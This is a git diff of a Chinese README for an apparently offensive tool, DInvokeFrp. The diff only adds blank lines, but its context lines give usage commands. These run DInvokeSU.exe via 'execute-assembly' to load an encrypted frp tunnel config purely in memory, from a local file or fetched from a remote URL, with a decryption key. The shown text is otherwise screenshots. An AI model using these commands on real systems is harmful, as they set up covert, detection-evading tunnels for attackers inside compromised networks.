@@ -44,6 +44,7 @@ DInvokeSU.exe --file C:\users\public\main.bin 加密配置 --key 加密密钥
 execute-assembly纯内存加载
 远程加载加密frp
 execute-assembly DInvokeSU.exe --url http://192.168.124.1:8080/main.bin 加密配置 --key duxaz
+
 <img width="416" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/3e2338f2-fc43-4f75-9dc4-01fdbae8507d">
 
 
@@ -54,6 +55,7 @@ execute-assembly DInvokeSU.exe --file C:\Users\Public\main.bin 加密配置 --ke
 
 
 效果
+
 <img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/bc0ddc61-54f6-4ae6-9d2d-0a2745756851">
 <img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/a52ed17b-976d-42cf-b89d-5b8936598a78">
 
